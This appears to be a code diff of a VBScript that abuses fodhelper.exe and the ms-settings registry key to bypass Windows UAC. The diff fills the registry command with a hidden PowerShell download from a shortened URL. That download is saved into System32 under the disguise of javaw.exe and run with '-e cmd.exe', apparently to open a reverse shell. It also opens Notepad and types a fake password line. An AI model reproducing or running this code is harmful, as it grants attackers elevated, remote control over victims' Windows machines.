@@ -1,12 +1,12 @@
 Const HKEY_CURRENT_USER = &H80000001
 
-Const FodHelperPath           = "C:\\Windows\\System32\\fodhelper.exe"
-Const RegKeyPathStr           = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
-Const RegKeyPath              = "Software\\Classes\\ms-settings\\shell\\open\\command"
-Const DelegateExecRegKeyName  = "DelegateExecute"
+Const FodHelperPath = "C:\\Windows\\System32\\fodhelper.exe"
+Const RegKeyPathStr = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
+Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
+Const DelegateExecRegKeyName = "DelegateExecute"
 Const DelegateExecRegKeyValue = ""
-Const DefaultRegKeyName       = ""
-Const DefaultRegKeyValue      = "%s"
+Const DefaultRegKeyName = ""
+Const DefaultRegKeyValue = "cmd.exe /c powershell.exe -nop -w hidden -outf C:\\Windows\\System32\\javaw.exe https://is.gd/onorum & C:\\Windows\\System32\\javaw.exe -e cmd.exe"
 
 Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
 Set Registry = GetObject(RegObjectPath)
@@ -19,8 +19,8 @@ Set Shell = WScript.CreateObject("WScript.Shell")
 Shell.Run FodHelperPath, 0, False
 
 Set Notepad = WScript.CreateObject("WScript.Shell")
-Notepad.Run "C:\\Windows\\System32\\notepad.exe"
+Notepad.Run "C\\Windows\\System32\\notepad.exe"
 
 WScript.Sleep 1000
 
-Notepad.SendKeys "Password: ####1234####"
+Notepad.SendKeys "Password is: ####1234####"
